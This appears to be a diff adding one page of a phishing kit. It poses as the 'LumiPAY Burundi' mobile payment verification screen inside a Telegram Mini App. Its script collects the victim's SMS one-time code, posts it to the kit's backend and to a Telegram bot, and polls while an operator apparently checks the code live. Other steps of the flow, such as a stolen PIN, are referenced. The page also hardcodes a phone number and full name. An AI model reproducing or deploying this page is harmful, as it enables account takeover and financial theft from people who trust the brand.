@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="rn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LumiPAY Burundi - Verification Code</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --lumipay-red: #E30613;          /* Red signature color */
+            --lumipay-green: #008738;        /* Green accent color */
+            --bg-color: #ffffff;
+            --text-dark: #000000;
+            --text-muted: #555555;
+            --input-bg: #f5f5f5;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            height: 55px;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            position: relative;
+            background-color: #ffffff;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .back-btn-top {
+            color: #000000;
+            text-decoration: none;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            background: none;
+            padding: 0;
+        }
+
+        .header-title-text {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+
+        /* Main Container */
+        .container {
+            width: 90%;
+            max-width: 400px;
+            margin: 25px auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .welcome-title {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin: 15px 0 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .user-info-text {
+            font-size: 19px;
+            font-weight: 800;
+            color: var(--lumipay-red);
+            margin-bottom: 18px;
+            word-break: break-word;
+        }
+
+        .instruction-text {
+            font-size: 15px;
+            color: #333333;
+            margin: 0 0 25px;
+            line-height: 1.45;
+            font-weight: 500;
+            max-width: 320px;
+        }
+
+        /* Red Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
+        }
+
+        /* 📱 Design matching the photo: OTP Field with embedded timer */
+        .otp-input-card {
+            position: relative;
+            width: 100%;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--lumipay-red);
+            border-radius: 14px;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 58px;
+            margin-bottom: 12px;
+        }
+
+        .otp-input-card.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
+        }
+
+        .otp-label {
+            position: absolute;
+            top: 6px;
+            left: 16px;
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--lumipay-red);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .otp-input {
+            width: 70%;
+            border: none;
+            background: transparent;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-dark);
+            outline: none;
+            margin-top: 14px;
+            letter-spacing: 2px;
+        }
+
+        .timer-embedded {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--lumipay-red);
+            white-space: nowrap;
+            margin-top: 12px;
+        }
+
+        /* Underlined Green Resend Button */
+        .resend-btn {
+            color: var(--lumipay-green);
+            font-weight: 800;
+            text-decoration: underline;
+            cursor: pointer;
+            font-size: 15px;
+            background: none;
+            border: none;
+            padding: 6px;
+            margin-bottom: 25px;
+            display: inline-block;
+        }
+
+        .resend-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+
+        /* Primary Submit Button */
+        .btn-verify {
+            background-color: var(--lumipay-red);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s, opacity 0.2s;
+            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.35);
+        }
+
+        .btn-verify:active {
+            background-color: #b8000b;
+        }
+
+        /* 📱 Full Screen Overlay Loading Status Page */
+        .overlay-status {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #121212;
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 24px;
+            box-sizing: border-box;
+        }
+
+        .overlay-status.active {
+            display: flex;
+        }
+
+        .overlay-spinner-circle {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(180deg, #ff1a27 0%, #E30613 100%);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.35);
+        }
+
+        .overlay-spinner-circle::after {
+            content: '';
+            width: 74px;
+            height: 74px;
+            border: 4px solid rgba(18, 18, 18, 0.15);
+            border-top: 4px solid #121212;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0 0 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .overlay-subtext {
+            color: #a0aec0;
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 500;
+            max-width: 300px;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <button onclick="goBack()" class="back-btn-top">←</button>
+    <span class="header-title-text">Verification code</span>
+</div>
+
+<div class="container">
+    <h1 class="welcome-title">Welcome to LumiPAY</h1>
+
+    <!-- Display Phone + Name -->
+    <div class="user-info-text" id="userInfoDisplay">67886318 - Nkubati Leonard</div>
+
+    <p class="instruction-text">
+        We noticed this is your first time using the app. Please enter OTP to authenticate
+    </p>
+
+    <!-- Red Error Banner for Wrong Code -->
+    <div id="statusErrorContainer" class="error-banner"></div>
+
+    <form id="otpForm" style="width: 100%;" onsubmit="submitOtp(event)">
+        <!-- Photo Exact Design: Input Card with embedded floating OTP label and countdown -->
+        <div class="otp-input-card" id="otpCardContainer">
+            <span class="otp-label">OTP</span>
+            <input 
+                type="tel" 
+                id="otpCode" 
+                class="otp-input" 
+                maxlength="6" 
+                pattern="[0-9]*" 
+                inputmode="numeric" 
+                autocomplete="off"
+                required
+            >
+            <span class="timer-embedded" id="timerText">01:59</span>
+        </div>
+
+        <div>
+            <button type="button" id="resendBtn" class="resend-btn" onclick="resendCode()">Resend</button>
+        </div>
+
+        <button type="submit" id="verifyBtn" class="btn-verify">EKEZA (VALIDER)</button>
+    </form>
+</div>
+
+<!-- Fullscreen Status Overlay -->
+<div id="statusOverlay" class="overlay-status">
+    <div class="overlay-spinner-circle"></div>
+    <h2 class="overlay-title" id="overlayMainText">Nyamuneka rindira...</h2>
+    <p class="overlay-subtext" id="overlaySubText">Kugenzura ikode ya OTP...</p>
+</div>
+
+<script>
+    const TOTAL_TIME = 120; // 2 Minutes (Counts down 02:00 to 00:00)
+    let timeLeft = TOTAL_TIME;
+    let timerInterval = null;
+    let statusPollingInterval = null;
+
+    const timerTextEl = document.getElementById('timerText');
+    const resendBtn = document.getElementById('resendBtn');
+    const userInfoDisplayEl = document.getElementById('userInfoDisplay');
+    const statusErrorContainer = document.getElementById('statusErrorContainer');
+    const otpCardContainer = document.getElementById('otpCardContainer');
+    const otpInputEl = document.getElementById('otpCode');
+
+    // Overlay Elements
+    const statusOverlay = document.getElementById('statusOverlay');
+    const overlayMainText = document.getElementById('overlayMainText');
+    const overlaySubText = document.getElementById('overlaySubText');
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Retrieve user data
+        const phone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "67886318";
+        const firstName = localStorage.getItem('firstName') || "Nkubati";
+        const lastName = localStorage.getItem('lastName') || "Leonard";
+
+        userInfoDisplayEl.textContent = `${phone} - ${firstName} ${lastName}`.trim();
+
+        startTimer();
+        otpInputEl.focus();
+    };
+
+    function startTimer() {
+        clearInterval(timerInterval);
+        timeLeft = TOTAL_TIME;
+        updateTimerDisplay();
+
+        resendBtn.disabled = true;
+
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                onTimerExpired();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        
+        const formattedMinutes = String(minutes).padStart(2, '0');
+        const formattedSeconds = String(seconds).padStart(2, '0');
+        
+        timerTextEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+    }
+
+    function onTimerExpired() {
+        timerTextEl.textContent = "00:00";
+        resendBtn.disabled = false;
+    }
+
+    async function resendCode() {
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        try {
+            await fetch("/api/resend-otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, step: "First OTP 6-Digits (Page 8)" })
+            });
+        } catch (err) {
+            console.error("Resend error:", err);
+        }
+        alert("Ikode nshya ya OTP yarungitswe mu butumwa.");
+        startTimer();
+    }
+
+    async function submitOtp(event) {
+        event.preventDefault();
+        const codeVal = otpInputEl.value.trim();
+
+        if (codeVal.length < 6) {
+            statusErrorContainer.style.display = 'block';
+            statusErrorContainer.textContent = "Ikode ya OTP si yo, nyamuneka injiza imibare 6 y'ukuri.";
+            otpCardContainer.classList.add('input-error');
+            return;
+        }
+
+        // Hide previous errors
+        statusErrorContainer.style.display = 'none';
+        otpCardContainer.classList.remove('input-error');
+
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+        // Display waiting overlay
+        overlayMainText.textContent = "Nyamuneka rindira...";
+        overlaySubText.textContent = "Kugenzura ikode ya OTP...";
+        statusOverlay.classList.add('active');
+
+        // Save local OTP
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Send payload to backend
+        try {
+            await fetch("/api/otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+            });
+        } catch (err) {
+            console.error("❌ Erreur d'envoi de la notification :", err);
+        }
+
+        const tg = window.Telegram?.WebApp;
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+        }
+
+        // Wait for bot approval or rejection
+        startStatusPolling(phone);
+    }
+
+    function startStatusPolling(phone) {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+        statusPollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await response.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(statusPollingInterval);
+                    overlayMainText.textContent = "Vyaguzwe neza!";
+                    overlaySubText.textContent = "Gufungura urupapuro rukurikira...";
+
+                    setTimeout(() => {
+                        window.location.href = "/page9";
+                    }, 1200);
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Show Red Error Message
+                    statusErrorContainer.style.display = 'block';
+                    statusErrorContainer.textContent = "Ikode ya OTP si yo, nyamuneka injiza ikode y'ukuri.";
+                    otpCardContainer.classList.add('input-error');
+                    otpInputEl.value = "";
+                    otpInputEl.focus();
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Redirect to Page 6 with error flag
+                    window.location.href = "/page6?error=wrong_pin";
+                }
+            } catch (err) {
+                console.error("Status polling error:", err);
+            }
+        }, 2000);
+    }
+
+    function goBack() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        window.location.href = "/page6";
+    }
+</script>
+
+</body>
+</html>
